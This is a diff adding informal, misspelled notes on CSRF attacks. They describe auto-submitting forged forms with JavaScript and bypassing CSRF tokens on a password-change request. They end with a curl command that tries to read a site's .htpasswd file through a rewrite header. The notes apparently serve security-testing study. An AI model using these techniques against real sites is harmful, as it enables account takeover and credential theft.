@@ -1,0 +1,37 @@
+injection point for csrf 
+1.get base 
+2.post base
+request are not validated at server side 
+server does check the user genarated the request 
+if it is get or  post just copy the form from the web 
+save the form with .html  and the action field must be full url. if its only the file it doesnt now where the file is locted ,
+than use type as hidden in the form  well as subit button to hidden
+than add the value in the form eg: value ="asdfghhj" 
+now you should make the submit the form automatically using java script
+eg: id =form1 ==> gjive this in form near action and use java script code 
+<script> document.getElementById('form1').submit();</script>
+after that you should send it to your target machine using the page should be hosted in webhosting company 
+
+tip 1
+you can bypass the csrf token by simply removing the token 
+tip 2 
+try to convert the post to get and remove the csrf token if it still work there sever side csrf 
+POST /change_passwordPOST body:new_password=qwerty
+
+Can be rewritten as:
+
+GET /change_password?new_password=qwerty
+tip 3:
+some website check only for valid token but not whoes the token belongs to 
+so try to check like this 
+POST /change_passwordPOST body:new_password=qwerty &csrf_tok=871caef0757a4ac9691aceb9aad8b65b
+
+Send this:
+
+POST /change_password
+POST body:new_password=qwerty &csrf_tok=YOUR_TOKEN
+tip 4:
+
+
+bypass 403
+ curl -s -i -K -X $'GET' -H $'Host: tcxsandbox.com' -H $'X-rewrite-url: /.htpsswd' $'http://tcxsandbox.com/'
